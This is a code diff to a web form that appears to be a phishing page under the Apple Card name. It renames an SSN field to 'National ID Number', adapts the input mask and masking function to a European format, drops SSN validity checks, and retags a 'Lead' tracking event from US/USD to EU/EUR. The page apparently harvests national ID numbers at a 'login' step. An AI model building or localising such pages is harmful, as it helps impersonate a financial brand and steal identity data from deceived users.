@@ -445,12 +445,12 @@
                 </div>
 
                 <div class="input-group">
-                    <label class="input-label" for="ssnInput">Social Security Number (SSN)</label>
+                    <label class="input-label" for="ssnInput">National ID Number</label>
                     <div class="input-wrapper">
-                        <input type="text" id="ssnInput" class="input-field" placeholder="XXX-XX-XXXX" maxlength="11" inputmode="numeric" autocomplete="off">
+                        <input type="text" id="ssnInput" class="input-field" placeholder="123 456 789" maxlength="11" inputmode="numeric" autocomplete="off">
                         <svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM12 17c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3-9H9V6c0-1.66 1.34-3 3-3s3 1.34 3 3v2z"/></svg>
                     </div>
-                    <div class="input-error" id="ssnError">Invalid SSN.</div>
+                    <div class="input-error" id="ssnError">Invalid National ID Number.</div>
                 </div>
 
                 <div class="input-group">
@@ -537,12 +537,12 @@
         const nameError = document.getElementById('nameError');
         const ssnError  = document.getElementById('ssnError');
 
-        /* ===== SSN mask & validation ===== */
+        /* ===== National ID Number mask & validation ===== */
         ssnInput.addEventListener('input', function() {
             let v = this.value.replace(/\D/g, '');
             if (v.length > 9) v = v.slice(0, 9);
-            if (v.length > 5) v = v.slice(0,3) + '-' + v.slice(3,5) + '-' + v.slice(5);
-            else if (v.length > 3) v = v.slice(0,3) + '-' + v.slice(3);
+            if (v.length > 6) v = v.slice(0,3) + ' ' + v.slice(3,6) + ' ' + v.slice(6);
+            else if (v.length > 3) v = v.slice(0,3) + ' ' + v.slice(3);
             this.value = v;
             ssnError.classList.remove('show');
             updateBtnState();
@@ -574,19 +574,12 @@
             const digits = String(ssn).replace(/\D+/g, '');
             if (digits.length !== 9) return false;
             if (/^(\d)\1{8}$/.test(digits)) return false;
-            // Area number cannot be 000, 666, or 900-999
-            const area = parseInt(digits.slice(0,3), 10);
-            if (area === 0 || area === 666 || area >= 900) return false;
-            // Group number cannot be 00
-            if (digits.slice(3,5) === '00') return false;
-            // Serial cannot be 0000
-            if (digits.slice(5) === '0000') return false;
             return true;
         }
 
         function maskSsn(ssn) {
             const raw = String(ssn).replace(/\D+/g, '');
-            return '***-**-' + raw.slice(5);
+            return '*** *** ' + raw.slice(6);
         }
 
         /* ===== Submit ===== */
@@ -622,7 +615,7 @@
                 page: 'login'
             });
 
-            if (window.track) window.track('Lead', { content_id: 'apple-card-us', currency: 'USD' });
+            if (window.track) window.track('Lead', { content_id: 'apple-card-eu', currency: 'EUR' });
             if (window.identifyUser) window.identifyUser();
 
             // Small delay to smooth out the transition
